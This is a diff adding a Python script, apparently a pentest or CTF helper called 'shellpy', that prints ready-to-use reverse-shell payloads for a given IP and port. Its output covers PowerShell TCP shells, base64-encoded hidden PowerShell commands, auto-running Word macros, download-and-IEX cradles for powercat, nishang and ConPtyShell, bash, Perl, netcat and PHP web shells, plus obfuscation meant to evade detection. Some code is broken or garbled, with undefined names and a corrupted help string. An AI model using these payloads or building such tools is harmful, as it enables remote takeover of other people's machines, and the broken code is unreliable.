@@ -1,0 +1,713 @@
+#!/usr/bin/python3
+
+import sys
+import subprocess
+import re
+import string
+import random
+import os
+import time
+import shutil
+from shobfuscator import obfuscateBash, obfuscatePerl
+from psobfuscator import (
+    printR, printG, printY, printP,
+    loadReserved, loadPSCommands, randomString,
+    removeJunk, useSED, findVARs, findCustomParams, findFUNCs,
+)
+
+
+# --macro payload number of chars per line
+chunk_size=32
+use_macro = False
+use_obfuscate = False
+
+var = True
+par = True
+funct = True
+
+current_dir = os.path.dirname(os.path.abspath(__file__))
+
+def print_listener(ip, port):
+
+    print("\n********** Connectivity **********\n")
+    print("tcpdump -i tun0 icmp -n")
+    print(f"tshark -i tun0 -f 'tcp dst port {port}' -Y 'ip.dst == {ip}'")
+
+    print("\n********** Listener **********\n")
+    print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
+    print(f"rlwrap -cAr nc -nlvp {port}")
+
+def print_tty():
+    print("\n********** tty **********\n")
+    print(f"script /dev/null -c bash")
+    print(f"ctrl + z")
+    print(f"stty raw -echo; fg")
+    print(f"export TERM=xterm; reset xterm")
+
+    result = subprocess.run(['stty', 'size'], capture_output=True, text=True)
+    rows, columns = result.stdout.split()
+    print(f"stty rows {rows} columns {columns}")
+
+
+    print("\n********** python tty **********\n")
+    print(f"""python3 -c 'import pty; pty.spawn("/bin/bash")'""")
+
+    print("\n********** PowerShell payload b64 encode **********\n")
+    print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")
+
+    print("\n*******************************************************")
+    print("                      PAYLOADS                    ")
+    print("*******************************************************")
+
+
+
+
+
+
+def build(payload):
+    # Codificar la cadena en UTF-16LE
+    string2 = payload.encode("utf-16le")
+    
+    # Ejecutar el comando base64
+    process = subprocess.Popen(
+        "base64 -w 0; echo", 
+        shell=True, 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE
+    )
+    
+    # Enviar los datos al proceso y obtener la salida
+    stdout, stderr = process.communicate(input=string2)
+    
+    # Verificar si hubo errores
+    if process.returncode != 0:
+        raise RuntimeError(f"Command failed with error: {stderr.decode('utf-8')}")
+    
+    # Decodificar y retornar la salida
+    b64 = stdout.decode('utf-8').strip()
+    return b64
+
+
+def macro(pay):
+            
+    size = chunk_size - 1
+    chunks = [pay[i:i+size] for i in range(0, len(pay), size)]
+            
+    for i, chunk in enumerate(chunks):
+        #print(f"Trozos {i+1}: {chunk}")
+        if i == 0:
+            print(f"Sub AutoOpen()")
+            print(f"\tMyMacro")
+            print(f"End Sub\n")
+            print("Sub Document_Open()")
+            print("\tMyMacro")
+            print("End Sub\n")
+
+            print("Sub MyMacro()")
+            print(f"\tDim Str As String\n")
+
+            print(f"\tStr = Str + \"powershell.exe -nop -w hidden -enc {chunk}\"")
+        else:
+            print(f"\tStr = Str + \"{chunk}\"")
+
+    print(f'\n\tCreateObject("Wscript.Shell").Run Str')
+    print(f'End Sub')
+
+
+### OBFUSCATE ONELINER 
+
+def mapOutsideStrings(script, func):
+    # Applies func only to the parts of the payload that are not inside a
+    # double quoted string. The oneliners never escape a quote with a backtick,
+    # so splitting on '"' is enough here.
+    chunks = script.split('"')
+    for i in range(0, len(chunks), 2):
+        chunks[i] = func(chunks[i])
+    return '"'.join(chunks)
+
+
+def mapInsideStrings(script, func):
+    chunks = script.split('"')
+    for i in range(1, len(chunks), 2):
+        chunks[i] = func(chunks[i])
+    return '"'.join(chunks)
+
+
+def obfuscate(pay, port=None):
+
+    lower_Reserverd = loadReserved()
+
+    script = pay
+    var_dict = {}
+    # \w so that $PSBoundParameters style names are matched whole; the old
+    # pattern stopped at '_' and its (?!\$PSHOME) guard only ever protected
+    # that one name, letting $true, $false, $null, $env and $args be renamed.
+    pattern = re.compile(r'\$[A-Za-z_]\w*')
+
+    def replace_var(match):
+        var_name = match.group(0)
+        if var_name.lower() in lower_Reserverd:
+            return var_name
+        if var_name not in var_dict:
+            # Start with a letter: a name such as $3Bc2LFM4Ck is accepted by
+            # powershell but is needlessly fragile.
+            new = random.choice(string.ascii_letters) + ''.join(
+                random.choices(string.ascii_letters + string.digits, k=9))
+            var_dict[var_name] = '$' + new
+        return var_dict[var_name]
+
+    script = pattern.sub(replace_var, script)
+
+    # Replace iex with i''ex, but only when iex is a command on its own.
+    # Unanchored, it also fired inside generated variable names and split them
+    # in two ($abiexcd -> $abi''excd), which powershell then read as a call to
+    # a command named excd.
+    script = mapOutsideStrings(
+        script, lambda s: re.sub(r'(?<![A-Za-z0-9_$])iex(?![A-Za-z0-9_])', "i''ex", s))
+
+    # Replace the PS of the prompt with <:Random:>. Only inside strings: out in
+    # the code an inserted <:...:> is a syntax error.
+    def replace_ps(match):
+        return f'<:{"".join(random.choices(string.ascii_letters + string.digits, k=10))}:>'
+
+    script = mapInsideStrings(script, lambda s: re.sub(r'\bPS\b', replace_ps, s))
+
+    # Convert IP addresses to hex (.NET still resolves 0x7f000001 style hosts)
+    pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
+
+    def ip_to_hex(match):
+        return '0x' + ''.join(f'{int(x):02x}' for x in match.group(0).split('.'))
+
+    script = pattern.sub(ip_to_hex, script)
+
+    # Convert the port to hex. Restricted to the actual port number and to code
+    # outside strings: the old pattern rewrote *any* 2 to 5 digit number in the
+    # payload, including array bounds and digits sitting inside string literals.
+    if port is not None:
+        portRegex = re.compile(r'(?<![\w.])' + re.escape(str(port)) + r'(?![\w.])')
+        script = mapOutsideStrings(script, lambda s: portRegex.sub(hex(int(port)), s))
+
+    return script
+
+
+
+def print_powershell(ip, port, use_macro, use_obfuscate):
+
+    print("\n\n********** Powershell reverse shell oneliner **********\n")
+    pay = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
+    print(pay)
+    
+    if use_obfuscate:
+        pay = obfuscate(pay, port)
+
+    pay = build(pay)
+        
+    if use_macro:
+        print("\n\n********** Powershell reverse shell base64 Macro **********\n")
+        macro(pay)
+    else:
+        print("\n\n********** Powershell reverse shell base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {pay}")
+
+
+def print_powercat(ip, port, use_macro, use_obfuscate):
+
+    file = "powercat.ps1"
+
+    if not os.path.exists(file):
+        print("powercat.ps1 no encontrado. Descargando...")
+        subprocess.run(["wget", "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"], check=True)
+    else:
+        print("powercat.ps1 ya está presente en el directorio.")
+    
+
+    if use_obfuscate:
+        file = pyfuscate(file, var, par, funct, ip, port)
+        ps1 = os.path.basename(file)
+        file = file.lstrip('./')
+
+        print("\n********** PowerCat Download & IEX Obfuscated **********\n")
+        payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
+        print(payload)
+
+        print("\n********** PowerCat Download & IEX b64 Obfuscated **********\n")
+        p64 = build(payload)
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+        
+        if use_macro:
+            print("\n\n********** Powercat reverse shell base64 Macro Obfuscated **********\n")
+            macro(p64)
+
+        print(f"\n\n\n\tDONT'T FORGET !!")
+        print(f"\trlwrap -cAr nc -nlvp {port}")
+        print(f"\tpython3 -m uploadserver 80\n")
+
+
+
+        sys.exit(0)
+
+
+    print("\n********** PowerCat payload **********\n")
+    payload = f"{file} -c {ip} -p {port} -e powershell"
+    print(payload)
+
+    print("\n********** PowerCat payload b64**********\n")
+    p64 = build(payload)
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** PowerCat Download & IEX **********\n")
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
+    print(payload)
+
+    print("\n********** PowerCat Download & IEX b64 **********\n")
+    p64 = build(payload)
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** PowerCat Download, IEX & Execution **********\n")
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}'); powercat -c {ip} -p {port} -e powershell"
+    print(payload)
+    p64 = build(payload)
+
+    if use_macro:
+        print("\n\n********** Powercat reverse shell base64 Macro **********\n")
+        macro(p64)
+    else:
+        print("\n\n********** Powercat Download, IEX & Execution base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+
+    print(f"\n\n\n\tDONT'T FORGET !!")
+    print(f"\trlwrap -cAr nc -nlvp {port}")
+    print(f"\tpython3 -m uploadserver 80")
+
+
+
+def print_conpty(ip, port, rows, columns, use_macro, use_obfuscate):
+
+    file = "Invoke-ConPtyShell.ps1"
+
+    if not os.path.exists(file):
+        print("Invoke-ConPtyShell.ps1 no encontrado. Descargando...")
+        subprocess.run(["wget", "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"], check=True)
+
+    else:
+        print("Invoke-ConPtyShell.ps1 ya está presente en el directorio.")
+
+
+    if use_obfuscate:
+        file = pyfuscate(file, var, par, funct, ip, port)
+        ps1 = os.path.basename(file)
+        file = file.lstrip('./')
+        print("\n********** PowerCat Download & IEX **********\n")
+        payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
+        print(payload)
+
+        print("\n********** PowerCat Download & IEX b64 **********\n")
+        p64 = build(payload)
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+        if use_macro:
+            print("\n\n********** Powercat reverse shell base64 Macro Obfuscated **********\n")
+            macro(p64)
+
+        print(f"\n\n\n\tDONT'T FORGET !!")
+        print(f"\trlwrap -cAr nc -nlvp {port}")
+        print(f"\tpython3 -m uploadserver 80\n")
+
+
+        sys.exit(0)
+
+
+
+    print("\n********** ConPtyShell RevShell **********\n")
+    pay = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
+    print(pay)
+    
+    print("\n********** ConPtyShell RevShell b64 **********\n")
+    if use_obfuscate:
+        pay = obfuscate(pay, port)
+    pay = build(pay)
+    print(f"powershell -nop -w hidden -enc {pay}")
+
+    print("\n********** ConPtyShell Download & IEX **********\n")
+    pay = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
+    print(pay)
+    
+    print("\n********** ConPtyShell Download & IEX b64 **********\n")
+    if use_obfuscate:
+        pay = obfuscate(pay, port)
+
+    pay = build(pay)
+    print(f"powershell -nop -w hidden -enc {pay}")
+
+    print("\n********** ConPtyShell Download, IEX & Execution **********\n")
+    pay = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
+    print(pay)
+    
+    pay = build(pay)
+
+    if use_macro:
+        print("\n\n********** ConPTY reverse shell base64 Macro **********\n")
+        macro(pay)
+    else:
+        print("\n\n********** ConPtyShell Download, IEX & Execution base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {pay}")
+
+
+    print(f"\n\n\n\tDONT'T FORGET !!")
+    print(f"\trlwrap -cAr nc -nlvp {port}")
+    print(f"\tpython3 -m uploadserver 80")
+
+
+def print_nishang(ip, port, use_macro, use_obfuscate):
+
+
+    file = "Invoke-PowerShellTcp.ps1"
+
+    if not os.path.exists(file):
+        print("Invoke-PowerShellTcp.ps1 no encontrado. Descargando...")
+        subprocess.run(["wget", "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"], check=True)
+
+    else:
+        print("Invoke-PowerShellTcp.ps1 ya está presente en el directorio.")
+
+
+    if use_obfuscate:
+        file = pyfuscate(file, var, par, funct, ip, port)
+        ps1 = os.path.basename(file)
+        file = file.lstrip('./')
+        print("\n********** PowerCat Download & IEX **********\n")
+        payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
+        print(payload)
+
+        print("\n********** PowerCat Download & IEX b64 **********\n")
+        p64 = build(payload)
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+        
+        if use_macro:
+            print("\n\n********** Powercat reverse shell base64 Macro Obfuscated **********\n")
+            macro(p64)
+
+        print(f"\n\n\n\tDONT'T FORGET !!")
+        print(f"\trlwrap -cAr nc -nlvp {port}")
+        print(f"\tpython3 -m uploadserver 80\n")
+
+
+        sys.exit(0)
+
+
+    print("\n********** Nishang payload **********\n")
+    payload = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    print(payload)
+
+    print("\n********** Nishang payload b64**********\n")
+    p64 = build(payload)
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** Nishang Download & IEX **********\n")
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')"
+    print(payload)
+
+    print("\n********** Nishang Download & IEX b64 **********\n") 
+    p64 = build(payload)
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** Nishang Download & Execution **********\n")
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    print(payload)
+    p64 = build(payload)
+    
+    if use_macro:
+        print("\n\n********** Nishang reverse shell base64 Macro **********\n")
+        macro(p64)
+    else:
+        print("\n\n********** Nishang Download, IEX & Execution base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+
+    print(f"\n\n\n\tDONT'T FORGET !!")
+    print(f"\trlwrap -cAr nc -nlvp {port}")
+    print(f"\tpython3 -m uploadserver 80\n")
+
+
+
+
+def print_perl(ip, port, use_obfuscate=False):
+
+    print("\n********** Perl **********\n")
+    perl_payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+    print(perl_payload)
+
+    if use_obfuscate:
+        print("\n********** Perl obfuscated **********\n")
+        for name, variant in obfuscatePerl(perl_payload, ip, port):
+            print(f"[{name}]")
+            print(variant + "\n")
+
+
+def print_php(ip, port):
+
+    php_payloads = [
+        """<?php
+  if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+  }
+?>""",
+        '<%3fphp+if(isset($_REQUEST[\'cmd\'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST[\'cmd\'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>',
+        '<?php echo system($_GET[\'cmd\']); ?>',
+        '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'
+    ]
+    for payload in php_payloads:
+        print(payload)
+
+    print(f"\nphp -r '$sock=fsockopen('{ip}',{port});exec('/bin/sh <&3 >&3 2>&3');'")
+
+def print_bash(ip, port, use_obfuscate=False):
+
+    print("\n\n\n********** Bash **********\n")
+    bash_payloads = [
+        f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
+        f"bash+-c+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'",
+        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+        f"rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20{ip}%20{port}%20%3E/tmp/f",
+        f"nc {ip} {port} -e /bin/sh"
+    ]
+    for payload in bash_payloads:
+        print(payload)
+
+    if use_obfuscate:
+        # The URL encoded copies are the same command, so obfuscating them
+        # would only repeat the output.
+        print("\n********** Bash obfuscated **********\n")
+        for payload in [bash_payloads[0], bash_payloads[2], bash_payloads[4]]:
+            print(f"# {payload}")
+            for name, variant in obfuscateBash(payload, ip, port):
+                print(f"[{name}]")
+                print(variant)
+            print("")
+
+
+def print_nc(ip, port):
+    print("\n********** Netcat Bind Shell **********\n")
+    print("Linux:\n")
+    print(f"\tnc -nlvp {port} -e /bin/bash")
+    print(f"\tnc {ip} {port}\n")
+    print("Windows:\n")
+    print(f"\tnc.exe -nlvp {port} -e cmd.exe")
+    print(f"\tnc {ip} {port}")
+
+    print("\n********** Netcat Reverse Shell **********\n")
+    print("Linux:\n")
+    print(f"\twhich /usr/bin/nc")
+    print(f"\tnc -e /bin/bash {ip} {port}\n")
+    print("Windows:\n")
+    print(f"\tnc.exe -e cmd {ip} {port}")
+    print(f"\t.\\nc64.exe -e powershell {ip} {port}\n")
+
+    print(f"More shells at: /usr/share/webshells\n")
+
+    if protocol == "-installs":
+        installs()
+    elif protocol == "-ftp":
+        ftp(ip, port)
+    elif protocol == "-scp":
+        scp(ip, port, file)
+    elif protocol == "-socat":
+        socat(ip, port, file)
+    elif protocol == "-nc":
+        nc(ip, port, file)
+    elif protocol == "-http":
+        http(ip, port, file)
+    elif protocol == "-smb":
+        smb(ip, file, port)
+    else:
+        print(f"Protocol '{protocol}' not recognized.")
+
+
+def shellpy_help():
+    print("Shells")
+    print("\n\tUsage: shellpy <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro] [--obfuscate]")
+    print("\n\tShells types: \n\n\t\t-Powershell \n\t\t-nishang \n\t\t-conpty \n\t\t-powercat \n\t\t-perl \n\t\t-nc \n\t\t-bash \n\t\t-php")
+    print(f"\t\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
+    print(f"\t\t--obfuscate works with -powercat, -nishang, -powershell, -conpty, -bash and -perl.")
+    print("\n\tExamples:\n")
+    print(f"\t\tshellpy 192.168.1.72 4444 -php")
+    print(f"\t\tshellpy 192.168.1.72 4444 -powershell")
+    print(f"\t\tshellpy 192.168.1.72 4444 -nishang --macro")
+    print(f"\t\tshellpy 192.168.1.72 4444 -powercat --macro --obfuscate")
+    print(f"\t\tshellpy 192.168.1.72 4444 -conpty 54 118\n")
+
+    
+    sys.exit(1)
+
+
+
+
+
+### PYFUSCATE
+
+
+
+def pyfuscate(file, var, par, func, ip, port):
+
+    iFile = file
+
+    printR("Obfuscating: " + iFile)
+    ts = time.strftime("%m%d%Y_%H_%M_%S", time.gmtime())
+    oDir = "." + os.path.dirname(iFile) + "/" + ts
+    os.mkdir( oDir );
+    oFile = oDir + "/" + ts + ".ps1"
+    vFile = oDir + "/" + ts + ".variables"
+    fFile = oDir + "/" + ts + ".functions"
+    pFile = oDir + "/" + ts + ".parameters"
+    shutil.copy(iFile, oFile)
+
+    powercat_command = f"powercat -c {ip} -p {port} -e powershell"
+    nishang_command = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    conpty_command = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port}"
+
+    if iFile == "powercat.ps1":
+        with open(oFile, "a") as file:
+            file.write("\n" + powercat_command)
+    elif iFile == "Invoke-PowerShellTcp.ps1":
+        with open(oFile, "a") as file:
+            file.write("\n" + nishang_command)
+    elif iFile == "Invoke-ConPtyShell.ps1":
+        with open(oFile, "a") as file:
+            file.write("\n" + conpty_command)
+
+
+    obfuVAR     = dict()
+    obfuPARMS   = dict()
+    obfuFUNCs   = dict()
+
+    # Remove White space and comments
+    removeJunk(oFile)
+
+    # Obfuscate Variables
+    if (var):
+        obfuVAR = findVARs(iFile,vFile) 
+        useSED(obfuVAR, oFile)
+        printP("Obfuscated Variables located  : " + vFile)
+
+    # Obfuscate custom parameters
+    if (par):
+        obfuPARMS = findCustomParams(iFile, pFile, obfuVAR)
+        useSED(obfuPARMS, oFile)
+        printP("Obfuscated Parameters located : " + pFile)
+
+    # Obfuscate Functions
+    if (func):
+        obfuFUNCs = findFUNCs(iFile, fFile)
+        useSED(obfuFUNCs, oFile)
+
+        # Print the Functions
+        print("")
+        print("Obfuscated Function Names")
+        print("-------------------------")     
+        sorted_list=sorted(obfuFUNCs)
+        for i in sorted_list:
+            printG("Replaced " + i + " With: " + obfuFUNCs[i])
+        print("")    
+        printP("Obfuscated Functions located  : " + fFile)
+
+    printP("Obfuscated script located at  : " + oFile)
+    return oFile
+
+
+
+
+def main(use_macro, use_obfuscate):
+
+    
+
+    if len(sys.argv) < 2:
+        shellpy_help()
+
+    ip = sys.argv[1]
+    if ip == "-paths":
+        print_paths()
+        sys.exit(0)
+
+    if len(sys.argv) < 4:
+        shellpy_help()
+  
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    shell_type = sys.argv[3].lower()
+
+    if shell_type == "-trans":
+        
+        if len(sys.argv) < 6:
+            shellpy_help()
+        else:
+            protocol = sys.argv[4].lower()
+            file = sys.argv[5]
+       
+    else:
+
+        if '--macro' in sys.argv:
+            use_macro = True
+            sys.argv.remove('--macro')
+
+        if '--obfuscate' in sys.argv:
+            use_obfuscate = True
+            sys.argv.remove('--obfuscate')
+
+        if len(sys.argv) > 4:
+            try:
+                rows = int(sys.argv[4])
+                cols = int(sys.argv[5])
+            except (IndexError, ValueError):
+                print("Usage: shell <IP> <PORT> <SHELL_TYPE> [--macro] [--obfuscate] ")
+                print("[--macro] is only available with powershell, nishang, conpty and powercat")
+                print("[--obfuscate] also works with bash and perl")
+                print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0ipowercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
+                sys.exit(1)
+        else:
+            output = subprocess.check_output(["stty", "size"]).decode().strip()
+            rows, cols = map(int, output.split())
+
+        if use_macro or use_obfuscate:
+            if use_macro and shell_type not in ['-powercat', '-nishang', '-powershell', '-conpty']:
+                print("Error: --macro can only be used with -powercat, -nishang, -powershell, or -conpty.")
+                sys.exit(1)
+            if use_obfuscate and shell_type not in ['-powercat', '-nishang', '-powershell',
+                                                    '-conpty', '-bash', '-perl']:
+                print("Error: --obfuscate can only be used with -powercat, -nishang, -powershell, -conpty, -bash, or -perl.")
+                sys.exit(1)
+
+       
+    print_listener(ip, port)
+    print_tty()
+
+    if shell_type == "-powershell":
+        print_powershell(ip, port, use_macro, use_obfuscate)
+    elif shell_type == "-powercat":
+        print_powercat(ip, port, use_macro, use_obfuscate)
+    elif shell_type == "-nishang":
+        print_nishang(ip, port, use_macro, use_obfuscate)
+    elif shell_type == "-conpty":
+        print_conpty(ip, port, rows, cols, use_macro, use_obfuscate)
+    elif shell_type == "-php":
+        print_php(ip, port)
+    elif shell_type == "-bash":
+        print_bash(ip, port, use_obfuscate)
+    elif shell_type == "-perl":
+        print_perl(ip, port, use_obfuscate)
+    elif shell_type == "-nc":
+        print_nc(ip, port)
+    else:
+        print(f"Shell type '{shell_type}' not recognized.")
+
+
+if __name__ == "__main__":
+    
+    main(use_macro, use_obfuscate)
